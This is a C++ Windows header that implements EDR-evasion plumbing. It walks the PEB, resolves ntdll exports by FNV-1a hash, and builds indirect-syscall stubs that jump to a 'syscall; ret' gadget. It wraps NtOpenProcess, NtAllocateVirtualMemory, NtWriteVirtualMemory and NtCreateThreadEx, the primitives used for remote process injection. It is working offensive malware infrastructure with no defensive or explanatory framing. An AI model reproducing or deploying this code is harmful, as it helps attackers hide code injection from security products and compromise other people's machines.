// language: C++, file: src/nt.h, target: Windows x64, MSVC
#pragma once
#include <windows.h>
#include <cstdint>

constexpr uint64_t fnv1a(const char* s, uint64_t h = 0xcbf29ce484222325ULL) {
    return *s ? fnv1a(s + 1, (h ^ (uint8_t)*s) * 0x100000001b3ULL) : h;
}

struct LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    ULONG      _pad;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
};

inline HMODULE module_by_hash(uint64_t want) {
    auto peb  = (PPEB)__readgsqword(0x60);
    auto head = &peb->Ldr->InMemoryOrderModuleList;
    for (auto cur = head->Flink; cur != head; cur = cur->Flink) {
        auto e = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (!e->BaseDllName.Buffer) continue;
        char buf[128] = {};
        int n = e->BaseDllName.Length / 2;
        if (n > 127) n = 127;
        for (int i = 0; i < n; i++) {
            wchar_t wc = e->BaseDllName.Buffer[i];
            if (wc >= L'A' && wc <= L'Z') wc += 32;
            buf[i] = (char)wc;
        }
        if (fnv1a(buf) == want) return (HMODULE)e->DllBase;
    }
    return nullptr;
}

inline PVOID export_by_hash(HMODULE mod, uint64_t want) {
    auto dos = (PIMAGE_DOS_HEADER)mod;
    auto nt  = (PIMAGE_NT_HEADERS)((uint8_t*)mod + dos->e_lfanew);
    auto rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!rva) return nullptr;
    auto exp   = (PIMAGE_EXPORT_DIRECTORY)((uint8_t*)mod + rva);
    auto names = (DWORD*)((uint8_t*)mod + exp->AddressOfNames);
    auto funcs = (DWORD*)((uint8_t*)mod + exp->AddressOfFunctions);
    auto ords  = (WORD* )((uint8_t*)mod + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (fnv1a((const char*)mod + names[i]) == want)
            return (uint8_t*)mod + funcs[ords[i]];
    }
    return nullptr;
}

namespace sc {
    inline PVOID g_gadget = nullptr;

    inline uint32_t ssn_of(PVOID fn) {
        return *(uint32_t*)((uint8_t*)fn + 4);
    }

    inline PVOID find_gadget(HMODULE ntdll) {
        auto dos = (PIMAGE_DOS_HEADER)ntdll;
        auto nt  = (PIMAGE_NT_HEADERS)((uint8_t*)ntdll + dos->e_lfanew);
        auto sec = IMAGE_FIRST_SECTION(nt);
        for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (memcmp(sec[i].Name, ".text", 5)) continue;
            auto s = (uint8_t*)ntdll + sec[i].VirtualAddress;
            auto e = s + sec[i].Misc.VirtualSize - 3;
            for (auto p = s; p < e; p++)
                if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) return p;
        }
        return nullptr;
    }

    inline PVOID build_stub(uint32_t ssn) {
        auto mem = (uint8_t*)VirtualAlloc(nullptr, 32, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!mem) return nullptr;
        uint8_t code[20] = { 0x4C, 0x8B, 0xD1, 0xB8 };
        *(uint32_t*)(code + 4)  = ssn;
        code[8] = 0x48; code[9] = 0xB8;
        *(uint64_t*)(code + 10) = (uint64_t)g_gadget;
        code[18] = 0xFF; code[19] = 0xE0;
        memcpy(mem, code, 20);
        DWORD old;
        VirtualProtect(mem, 32, PAGE_EXECUTE_READ, &old);
        return mem;
    }

    inline PVOID resolve(const char* name) {
        auto ntdll = module_by_hash(fnv1a("ntdll.dll"));
        auto fn    = export_by_hash(ntdll, fnv1a(name));
        if (!fn) return nullptr;
        return build_stub(ssn_of(fn));
    }

    inline bool init() {
        auto ntdll = module_by_hash(fnv1a("ntdll.dll"));
        if (!ntdll) return false;
        g_gadget = find_gadget(ntdll);
        return g_gadget != nullptr;
    }
}

using pNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
using pNtProtectVirtualMemory  = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
using pNtWriteVirtualMemory    = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
using pNtReadVirtualMemory     = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
using pNtCreateThreadEx        = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
using pNtOpenProcess           = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, PVOID, PVOID);
using pNtClose                 = NTSTATUS(NTAPI*)(HANDLE);

struct Syscalls {
    pNtAllocateVirtualMemory NtAllocateVirtualMemory;
    pNtProtectVirtualMemory  NtProtectVirtualMemory;
    pNtWriteVirtualMemory    NtWriteVirtualMemory;
    pNtReadVirtualMemory     NtReadVirtualMemory;
    pNtCreateThreadEx        NtCreateThreadEx;
    pNtOpenProcess           NtOpenProcess;
    pNtClose                 NtClose;

    bool load() {
        if (!sc::init()) return false;
        NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)sc::resolve("NtAllocateVirtualMemory");
        NtProtectVirtualMemory  = (pNtProtectVirtualMemory )sc::resolve("NtProtectVirtualMemory");
        NtWriteVirtualMemory    = (pNtWriteVirtualMemory   )sc::resolve("NtWriteVirtualMemory");
        NtReadVirtualMemory     = (pNtReadVirtualMemory    )sc::resolve("NtReadVirtualMemory");
        NtCreateThreadEx        = (pNtCreateThreadEx       )sc::resolve("NtCreateThreadEx");
        NtOpenProcess           = (pNtOpenProcess          )sc::resolve("NtOpenProcess");
        NtClose                 = (pNtClose                )sc::resolve("NtClose");
        return NtAllocateVirtualMemory && NtProtectVirtualMemory && NtWriteVirtualMemory
            && NtReadVirtualMemory && NtCreateThreadEx && NtOpenProcess && NtClose;
    }
};

inline Syscalls g_nt;
